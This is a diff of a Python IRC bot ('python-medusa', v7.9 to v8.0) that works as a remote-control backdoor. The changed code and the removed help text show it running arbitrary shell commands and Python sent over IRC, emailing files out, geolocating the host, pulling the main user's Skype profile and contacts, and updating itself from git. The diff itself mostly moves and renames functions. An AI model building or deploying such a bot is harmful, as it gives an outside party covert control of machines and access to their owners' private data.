@@ -1,6 +1,6 @@
 # -*- coding: utf-8 -*-
 # MIT Liscence
-version = "7.9"                                                                 # bot version
+version = "8.0"                                                                 # bot version
 
 # library imports
 import socket
@@ -51,29 +51,6 @@ main_user = os.popen("stat -f '%Su' /dev/console").read().strip()               
 local_user = getpass.getuser()                                                  # user the bot is running as
 
 nick = '[%s|%s]' % (main_user, hostname)                                        # bot's nickname
-
-helpmsg = '''Version: v%s\n
-Public Commands (main channel): \n
- 1. !version                                                      #-- display bot version \n
- 2. !quit                                                         #-- shutdown the bot \n
- 3. !reload                                                       #-- reconnect to IRC \n
- 4. !identify                                                     #-- provide info on host system \n
- 5. !update                                                       #-- update the bot from git \n
- 6. $<command>                                                    #-- run <command> in shell and capture live output \n
- 7. >>><python>                                                   #-- eval/exec python live in the bot script \n
- 8. email$                                                        #-- send an email with attachments listed after $ \n
- Private Commands (admin privmsg only): \n
- 1. help                                                          #-- show this message \n
- 2. version                                                       #-- display bot version \n
- 3. quit                                                          #-- shutdown the bot \n
- 4. reload                                                        #-- reconnect to IRC \n
- 5. identify                                                      #-- provide verbose info on host system \n
- 6. update                                                        #-- update the bot from git \n
- 7. $<command>                                                    #-- run <command> in shell and capture live output \n
- 8. >>><python>                                                   #-- eval/exec python live in the bot script \n
- 9. email$                                                        #-- send an email with attachments listed after $ \n
- 9. skype$profile                                                 #-- get skype profile of main user \n
- 9. skype$contacts                                                #-- get skype contacts of main user \n''' % version
 
 ############ Flow functions
 
@@ -170,19 +147,6 @@ def privmsg(msg=None, to=admin):                                                
 def broadcast(msg):                                                             # function to send a message to the main channel
     privmsg(msg, channel)
 
-def reload_bot():
-    log('[#] ----Reloading Bot----')
-    privmsg('----Reloading Bot from file bot.py----')
-    cmd = "sleep 5; python bot.py &"
-    log('[>]    CMD:     ',cmd)
-    p = Popen([cmd],shell=True,executable='/bin/bash')
-    log('[#] ----New Process Spawned----')
-    privmsg('----New Process Spawned----')
-    quit_status = True
-    irc.send('QUIT\r\n')
-    raise SystemExit                                              
-    sys.exit()
-
 def still_connected(irc):
     signal.signal(signal.SIGALRM, timeout_handler)
     signal.alarm(3)
@@ -205,6 +169,19 @@ def still_connected(irc):
         signal.alarm(0)
         log("[X] PING/PONG Failed: %s" % pong_exception)
         return (False, "X: %s" % pong_exception)
+
+def reload_bot():
+    log('[#] ----Reloading Bot----')
+    privmsg('----Reloading Bot from file bot.py----')
+    cmd = "sleep 5; python bot.py &"
+    log('[>]    CMD:     ',cmd)
+    p = Popen([cmd],shell=True,executable='/bin/bash')
+    log('[#] ----New Process Spawned----')
+    privmsg('----New Process Spawned----')
+    quit_status = True
+    irc.send('QUIT\r\n')
+    raise SystemExit                                              
+    sys.exit()
 
 ############ Keyword functions
 
@@ -242,6 +219,12 @@ def geo_locate(ip="",with_proxy=False):                                         
     lng = geo[u"longitude"]
 
     return [city,country,region,zipcode,lat,lng]
+
+def status_report(irc, connection_time, reconnects, last_ping):
+    ping = round(time.time() - last_ping, 1)
+    connected = round(time.time() - connection_time, 1)
+    ping_speed = still_connected(irc)[1]
+    return "[v%s] connected[%ss] reconnects[%s] last_ping[%ss ago] ping_speed[%s]" % (version, connected, reconnects, ping, ping_speed)
 
 def identify():                                                                 # give some identifying info about the host computer
     log('[+] Running v%s Identification Modules...' % version)
@@ -403,7 +386,7 @@ def run_shell(cmd, timeout=60, verbose=False):                                  
             continue_running = False
             break
 
-def run_python(cmd, timeout=60):                                                            # interactively interprets recieved python code
+def run_python(cmd, timeout=60):                                                # interactively interprets recieved python code
     signal.signal(signal.SIGALRM, timeout_handler)
     signal.alarm(timeout)
     try:
@@ -499,12 +482,6 @@ def selfupdate(git_user="nikisweeting",git_repo="python-medusa"):               
     sleep(3)
     reload_bot()
 
-def status_report(irc, connection_time, reconnects, last_ping):
-    ping = round(time.time() - last_ping, 1)
-    connected = round(time.time() - connection_time, 1)
-    ping_speed = still_connected(irc)[1]
-    return "[v%s] connected[%ss] reconnects[%s] last_ping[%ss ago] ping_speed[%s]" % (version, connected, reconnects, ping, ping_speed)
-
 def admin(admins):
     for entry in admins:
         allowed_sources.append(entry)
@@ -521,7 +498,7 @@ if __name__ == '__main__':
     quit_status = False
     reconnects = -1
 
-    while not quit_status:
+    while not quit_status:                                                      # connection loop
         signal.signal(signal.SIGTERM, sigterm_handler)
         try:
             timeout_count = 0
@@ -553,7 +530,7 @@ if __name__ == '__main__':
                 timeout_count = 50
                 sleep(20)
 
-            while not quit_status and (timeout_count < 50):                     # if timeout_count is above 50, reconnect  
+            while not quit_status and (timeout_count < 50):                     # data receiving loop
                 try:
                     data = irc.recv(4096)
                     log('[+] Recieved:')
@@ -687,10 +664,7 @@ if __name__ == '__main__':
                                 broadcast("[X]: %s" % python_exception)
 
                     elif source == 'private':
-                        if content == 'help':
-                            privmsg(helpmsg,to=return_to)
-
-                        elif content == 'version':
+                        if content == 'version':
                             privmsg("v"+version,to=return_to)
 
                         elif content == 'identify':
@@ -715,7 +689,7 @@ if __name__ == '__main__':
                                 sleep(1)
                                 privmsg("Actual Location: %s" % location,to=return_to)
 
-                        elif content == 'skype$profiles':
+                        elif content == 'skype':
                             try:
                                 paths = skype.findProfiles()
                                 privmsg(paths, to=return_to)
@@ -783,10 +757,9 @@ if __name__ == '__main__':
             privmsg('Quitting Intentionally. %s' % quit_reason)
             irc.send('QUIT\r\n')
             break
-        except Exception as exit_exception:
-            log("[#] ----EXCEPTION---- ",exit_exception)
         except RuntimeError as exit_exception:
             log("[#] ----EXCEPTION---- ",exit_exception)
-            
+        except Exception as exit_exception:
+            log("[#] ----EXCEPTION---- ",exit_exception)        
     log("[*] EXIT")
     raise SystemExit(0)
